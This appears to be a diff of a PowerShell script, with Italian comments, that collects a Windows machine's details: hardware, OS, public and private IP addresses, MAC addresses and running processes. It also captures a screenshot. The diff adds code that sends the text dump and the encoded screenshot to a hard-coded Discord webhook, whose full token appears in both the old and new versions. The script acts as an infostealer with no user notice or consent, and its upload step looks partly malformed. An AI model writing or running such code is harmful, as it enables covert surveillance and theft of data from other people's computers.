@@ -1,30 +1,114 @@
-# URL del Webhook Discord
-$webhookUrl = 'https://discord.com/api/webhooks/1305148744034942987/rIucBCJqT3ZvW9zzlZiE889d11X5xaKSk1h8cgK-LwaiRFBhX-iwowFKg9xAVZHt326I'
+# Funzione per ottenere l'indirizzo IP pubblico
+function Get-PublicIP {
+    try {
+        $publicIP = (Invoke-WebRequest -Uri "https://api.ipify.org").Content
+        return $publicIP
+    } catch {
+        return "Impossibile ottenere l'IP pubblico"
+    }
+}
 
-# Raccogli informazioni di sistema
-$computerInfo = Get-ComputerInfo
-$cpuInfo = Get-WmiObject Win32_Processor | Select-Object -First 1
-$memoryInfo = Get-WmiObject Win32_OperatingSystem
-$osInfo = $computerInfo.OsArchitecture
-$csName = $computerInfo.CSName
-$windowsVersion = $computerInfo.WindowsVersion
-$cpuName = $cpuInfo.Name
-$totalMemory = [math]::round($memoryInfo.TotalVisibleMemorySize / 1MB, 2) # Total Memory in MB
-$freeMemory = [math]::round($memoryInfo.FreePhysicalMemory / 1MB, 2) # Free Memory in MB
+# Funzione per catturare uno screenshot e salvarlo
+function Capture-Screenshot {
+    Add-Type -TypeDefinition @"
+    using System;
+    using System.Drawing;
+    using System.Windows.Forms;
+    public class Screenshot {
+        public static void TakeScreenshot() {
+            Rectangle bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
+            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height)) {
+                using (Graphics g = Graphics.FromImage(bitmap)) {
+                    g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
+                }
+                bitmap.Save('C:\\Windows\\Temp\\screenshot.png');
+            }
+        }
+    }
+"@
+    [Screenshot]::TakeScreenshot()
+}
 
-# Costruisci il payload da inviare
-$payload = @{
-    content = "Informazioni di Sistema:
-    - Sistema Operativo: $osInfo
-    - Computer: $csName
-    - Versione Windows: $windowsVersion
-    - Processore: $cpuName
-    - Memoria Totale: $totalMemory MB
-    - Memoria Libera: $freeMemory MB"
-} | ConvertTo-Json
+# Ottieni informazioni sul sistema
+$systemInfo = Get-ComputerInfo
 
-# Debug: mostra il contenuto del payload
-Write-Host "Invio al Webhook: $($payload.content)"
+# Ottieni informazioni sul disco
+$diskInfo = Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, DriveType, @{Name="Size(GB)";Expression={[math]::round($_.Size / 1GB, 2)}}, @{Name="FreeSpace(GB)";Expression={[math]::round($_.FreeSpace / 1GB, 2)}}
 
-# Invio al Webhook Discord
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
+# Ottieni informazioni sulla CPU
+$cpuInfo = Get-WmiObject -Class Win32_Processor | Select-Object Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed
+
+# Ottieni informazioni sulla memoria
+$memoryInfo = Get-WmiObject -Class Win32_PhysicalMemory | Select-Object Manufacturer, Capacity, Speed
+
+# Ottieni gli indirizzi IP privati
+$privateIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet" | Select-Object -ExpandProperty IPAddress)
+
+# Ottieni l'indirizzo IP pubblico
+$publicIP = Get-PublicIP
+
+# Informazioni sul sistema operativo
+$osInfo = Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, Architecture
+
+# Interfacce di rete (MAC Address, etc.)
+$networkInterfaces = Get-NetAdapter | Select-Object Name, Status, MacAddress, LinkSpeed
+
+# Dettagli sui processi in esecuzione
+$processes = Get-Process | Select-Object Name, Id, CPU, Memory
+
+# Compilazione dei dati in un oggetto per la visualizzazione
+$info = @{
+    "Sistema" = $systemInfo
+    "Disco" = $diskInfo
+    "CPU" = $cpuInfo
+    "Memoria" = $memoryInfo
+    "Indirizzo IP Privato" = $privateIP
+    "Indirizzo IP Pubblico" = $publicIP
+    "Sistema Operativo" = $osInfo
+    "Interfacce di Rete" = $networkInterfaces
+    "Processi in Esecuzione" = $processes
+}
+
+# Creazione di una stringa di output
+$output = ""
+foreach ($key in $info.Keys) {
+    $output += "$key:`n"
+    $output += $info[$key] | Out-String
+    $output += "`n"
+}
+
+# Salvataggio dell'output in un file di testo
+$output | Out-File -FilePath "C:\Windows\Temp\system_info.txt"
+
+# Cattura dello screenshot
+Capture-Screenshot
+
+# Invia l'output al webhook Discord
+$webhookUrl = "https://discord.com/api/webhooks/1305148744034942987/rIucBCJqT3ZvW9zzlZiE889d11X5xaKSk1h8cgK-LwaiRFBhX-iwowFKg9xAVZHt326I"
+Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body (@{
+    content = "Informazioni di sistema raccolte:"
+    embeds = @(@{
+        title = "Dettagli di Sistema"
+        description = $output
+        color = 0x00FF00
+    })
+} | ConvertTo-Json)
+
+# Invio del file screenshot a Discord (usando il Webhook)
+$boundary = [System.Guid]::NewGuid().ToString()
+$fileContent = [System.IO.File]::ReadAllBytes("C:\Windows\Temp\screenshot.png")
+$base64Image = [Convert]::ToBase64String($fileContent)
+
+Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body (@{
+    "file" = @{
+        "name" = "screenshot.png"
+        "content" = $base64Image
+    }
+    "embeds" = @(
+        @{
+            "title" = "Screenshot"
+            "description" = "Screenshot del sistema"
+            "color" = 0xFF0000
+        }
+    )
+} | ConvertTo-Json)
